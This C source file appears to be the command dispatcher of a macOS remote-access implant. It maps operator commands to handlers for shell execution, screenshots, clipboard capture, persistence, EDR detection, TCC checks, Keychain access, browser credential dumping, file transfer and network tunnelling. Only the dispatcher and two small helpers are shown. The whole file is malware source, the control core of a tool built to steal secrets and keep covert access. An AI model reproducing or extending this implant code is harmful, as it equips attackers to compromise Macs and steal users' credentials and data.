#include "commander.h"
#include "crt.h"
#include "dyld_resolve.h"
#include "tasks_fs.h"
#include "tasks_proc.h"
#include "tasks_macos.h"
#include "tasks_async.h"
#include "tasks_net.h"

static int task_pwd(mp_writer_t* w);
static int task_error(mp_writer_t* w, const char* msg);

int handle_command(uint32_t code, uint32_t cmd_id,
                   const uint8_t* data, uint32_t data_len,
                   mp_writer_t* response) {
    (void)cmd_id;

    switch (code) {
        // ── Filesystem commands ──
        case COMMAND_PWD:
            return task_pwd(response);
        case COMMAND_CD:
            return task_cd(data, data_len, response);
        case COMMAND_CAT:
            return task_cat(data, data_len, response);
        case COMMAND_LS:
            return task_ls(data, data_len, response);
        case COMMAND_CP:
            return task_cp(data, data_len, response);
        case COMMAND_MV:
            return task_mv(data, data_len, response);
        case COMMAND_MKDIR:
            return task_mkdir(data, data_len, response);
        case COMMAND_RM:
            return task_rm(data, data_len, response);
        case COMMAND_ZIP:
            return task_zip(data, data_len, response);

        // ── Process commands ──
        case COMMAND_PS:
            return task_ps(response);
        case COMMAND_KILL:
            return task_kill(data, data_len, response);
        case COMMAND_SHELL:
            return task_shell(data, data_len, response);

        // ── macOS-specific commands ──
        case COMMAND_SCREENSHOT:
            return task_screenshot(response);
        case COMMAND_CLIPBOARD:
            return task_clipboard(response);
        case COMMAND_PERSIST:
            return task_persist(data, data_len, response);
        case COMMAND_TCC_CHECK:
            return task_tcc_check(response);
        case COMMAND_DEFAULTS:
            return task_defaults_read(data, data_len, response);
        case COMMAND_EDR_CHECK:
            return task_edr_check(response);
        case COMMAND_KEYCHAIN:
            return task_keychain(data, data_len, response);
        case COMMAND_BROWSER_DUMP:
            return task_browser_dump(data, data_len, response);

        // ── Control ──
        case COMMAND_EXIT:
            return -99;

        // ── Async/Job commands ──
        case COMMAND_DOWNLOAD:
            return task_download(data, data_len, response);
        case COMMAND_UPLOAD:
            return task_upload(data, data_len, response);
        case COMMAND_RUN:
            return task_run(data, data_len, response);
        case COMMAND_JOB_LIST:
            return task_job_list(response);
        case COMMAND_JOB_KILL:
            return task_job_kill(data, data_len, response);

        // ── Network commands ──
        case COMMAND_TUNNEL_START:
            return task_tunnel_start(data, data_len, response);
        case COMMAND_TUNNEL_STOP:
            return task_tunnel_stop(data, data_len, response);
        case COMMAND_TUNNEL_PAUSE:
            return task_tunnel_pause(data, data_len, response);
        case COMMAND_TUNNEL_RESUME:
            return task_tunnel_resume(data, data_len, response);
        case COMMAND_TERMINAL_START:
            return task_terminal_start(data, data_len, response);
        case COMMAND_TERMINAL_STOP:
            return task_terminal_stop(data, data_len, response);

        default:
            return task_error(response, "Unknown command");
    }
}

static int task_pwd(mp_writer_t* w) {
    char cwd[4096];
    if (R_getcwd(cwd, sizeof(cwd)) == (char*)0) {
        return task_error(w, "getcwd failed");
    }
    mp_write_map(w, 1);
    mp_write_kv_str(w, "path", cwd);
    return 0;
}

static int task_error(mp_writer_t* w, const char* msg) {
    mp_write_map(w, 1);
    mp_write_kv_str(w, "error", msg);
    return 0;
}
